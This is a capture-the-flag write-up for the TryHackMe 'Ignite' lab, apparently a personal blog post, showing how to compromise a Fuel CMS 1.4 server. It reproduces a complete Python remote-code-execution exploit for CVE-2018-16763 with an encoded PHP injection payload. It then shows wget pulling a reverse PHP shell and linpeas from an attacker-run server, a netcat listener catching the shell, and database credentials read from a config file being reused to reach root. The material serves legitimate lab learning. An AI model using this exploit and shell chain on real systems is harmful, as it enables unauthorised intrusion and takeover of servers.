---
toc: true
toc_label: "Table of Contents"
toc_icon: "list"
title: "TryHackMe: Ignite"
excerpt: "Ignite is an easy, free box on TryHackMe centered around web exploitation."
category: thm
---
![Ignite Logo]({{ site.url }}{{ site.baseurl }}/assets/images/THM/Ignite/logo.png)

## Box Information
Ignite is an easy, free box on TryHackMe centered around web exploitation. The box can be found here: [Source](https://tryhackme.com/room/ignite)

# Foothold
## Enumeration
* We will begin by running an **nmap** scan on the box:

```shell
└─$ nmap -sV -sC 10.10.19.192            
Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-04 19:35 PDT
Nmap scan report for 10.10.19.192
Host is up (0.22s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.99 seconds
```
* It appears that the server is hosted by FUEL CMS, running on port 80. We can also confirm this by visiting the main page of the website.
 
![Frontpage]({{ site.url }}{{ site.baseurl }}/assets/images/THM/Ignite/frontpage.png)

* There doesn't appear to be anything interesting on the mainpage, just the default configuration page.
 
* Next, let's run a **gobuster** scan to enumerate any subdirectories.

```shell
└─$ gobuster dir -u 10.10.19.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.19.192
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/04 20:08:58 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 16595]
/home                 (Status: 200) [Size: 16595]
/0                    (Status: 200) [Size: 16595]
/assets               (Status: 301) [Size: 313] [--> http://10.10.19.192/assets/]
/'                    (Status: 400) [Size: 1134]                                 
Progress: 5087 / 220561 (2.31%)                                                 ^C
[!] Keyboard interrupt detected, terminating.
                                                                                 
===============================================================
2022/09/04 20:16:23 Finished
===============================================================
```

* After a few scanned directories, I stopped the scan as it appeared all the URL's led to the same default configuration page.

* It doesn't seem like there was any insightful information even after port scanning and subdirectory enumeration, so I went to look at the default configuration page a bit more in depth.
 
## Recon
* Since I had not heard of the FuelCMS system before, my first instinct was to Google it. Consequently, one of the first results that appeared was the User Guide. However, notice that the version number is already 1.5.2 now.

![FuelCMS Version]({{ site.url }}{{ site.baseurl }}/assets/images/THM/Ignite/fuelcms_version.png)

* Looking back at the configuration page, the version running is **1.4**. This led me to believe that the version is likely far out of date. 

* Then, my first instinct was to check for any exploits application to the version number. After searching around on exploit-db, I stumbled upon an [RCE vulnerability for version 1.4.1](https://www.exploit-db.com/exploits/50477). 

```python
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
	parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

	parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

	parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

	args = parser.parse_args()

	if len(sys.argv) <=2:
		parser.print_usage()
		sys.exit()
	
	return args


args = get_arguments()
url = args.url 

if "http" not in url:
	sys.stderr.write("Enter vaild url")
	sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
	cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)
		
	main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

	r = requests.get(main_url)

	#<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

	output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
	print(output[0])
	if cmd == "exit":
		break
```

## Exploitation
* After downloading the script and running it against our target URL, we can see that it does indeed work!

```shell
└─$ python3 exploit.py -u http://10.10.230.52
[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt


Enter Command $whoami
systemwww-data


Enter Command $
```

* With the ability to execute commands on the fileserver, I tried to get a reverse shell to work with a few different one-liners. Despite getting clear code execution with Python, none of the payloads worked (not sure why).
 
```python
Enter Command $python3 -c "import time; time.sleep(120)"
```
* Instead, I opted to serve up a simple reverse PHP shell, since I noticed earlier that the webserver runs off PHP, as revealed by the **index.php** file.

* After setting up [this reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), I spun up a webserver on port 80 with Python to transfer the file over to the remote server.

```shell
└─$ sudo python3 -m http.server 80                                             1 ⨯
[sudo] password for ryan: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.230.52 - - [05/Sep/2022 08:35:39] "GET /reverse.php HTTP/1.1" 200 -
10.10.230.52 - - [05/Sep/2022 08:35:39] "GET /reverse.php HTTP/1.1" 200 -
```

* Using wget on the remote machine, I retrieved the file into the root directory of the webserver.

```shell
Enter Command $wget http://10.6.91.228/reverse.php
```
* Now, by visiting the webserver at `/reverse.php` and using netcat to accept all inbound connections, I was able to establish a reverse shell.

```shell
└─$ nc -lnvp 1234                                                                               1 ⨯
listening on [any] 1234 ...
connect to [10.6.91.228] from (UNKNOWN) [10.10.230.52] 37050
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 08:40:59 up 21 min,  0 users,  load average: 1.07, 1.04, 0.75
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

* The first user flag is revealed in the home directory:

```shell
$ cd /home
$ ls 
www-data
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
$ 
```

## Privilege Escalation

* My first step was to try and enumerate the system for any potential attack vectors. To do this, I used the [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script. Again, I hosted it using Python and used wget to move it into the `/tmp` directory.

```shell
$ wget http://10.6.91.228/linpeas.sh
--2022-09-05 08:56:49--  http://10.6.91.228/linpeas.sh
Connecting to 10.6.91.228:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 761415 (744K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  104K 7s
    50K .......... .......... .......... .......... .......... 13%  311K 4s
   100K .......... .......... .......... .......... .......... 20%  619K 3s
   150K .......... .......... .......... .......... .......... 26%  605K 2s
   200K .......... .......... .......... .......... .......... 33%  316K 2s
   250K .......... .......... .......... .......... .......... 40% 86.6M 1s
   300K .......... .......... .......... .......... .......... 47% 68.1M 1s
   350K .......... .......... .......... .......... .......... 53%  629K 1s
   400K .......... .......... .......... .......... .......... 60%  627K 1s
   450K .......... .......... .......... .......... .......... 67% 84.8M 1s
   500K .......... .......... .......... .......... .......... 73%  661K 0s
   550K .......... .......... .......... .......... .......... 80% 78.4M 0s
   600K .......... .......... .......... .......... .......... 87%  626K 0s
   650K .......... .......... .......... .......... .......... 94% 77.3M 0s
   700K .......... .......... .......... .......... ...       100% 25.3M=1.3s

2022-09-05 08:56:52 (580 KB/s) - 'linpeas.sh' saved [761415/761415]

$ ls
VMwareDnD
linpeas.sh
systemd-private-7f482da5aeff452f9055fe003f7b8931-colord.service-uCe1YA
systemd-private-7f482da5aeff452f9055fe003f7b8931-rtkit-daemon.service-Dr0RBc
systemd-private-7f482da5aeff452f9055fe003f7b8931-systemd-timesyncd.service-7QKpsB
$ chmod +x linpeas.sh
$ ./linpeas.sh
```
* Linpeas displayed these credentials during one of the checks:

```shell
╔══════════╣ Analyzing Backup Manager Files (limit 70)
                                                                                                                             
-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => '[REDACTED]',
        'database' => 'fuel_schema',
```
* Digging further, it appears that the credentials are in plain view within the web server folder. `config/database.php` contains these credentials:

```php
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => '[REDACTED]',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```
* Obviously, these appear to be the sign-in details of root. Using the password to log in to root gives us root!
 
**Note: Since this isn't a full reverse shell, you have to spawn an interactive shell in order to run su.**

```shell
$ su root
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/sh")'
ls
ls
$ MY_config.php      constants.php      google.php     profiler.php
MY_fuel.php          custom_fields.php  hooks.php      redirects.php
MY_fuel_layouts.php  database.php       index.html     routes.php
MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
asset.php            editors.php        migration.php  social.php
autoload.php         environments.php   mimes.php      states.php
config.php           foreign_chars.php  model.php      user_agents.php
$ su root
su root
Password: [REDACTED]

root@ubuntu:/var/www/html/fuel/application/config# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 
```
* Thanks for reading, I hope you learned something new!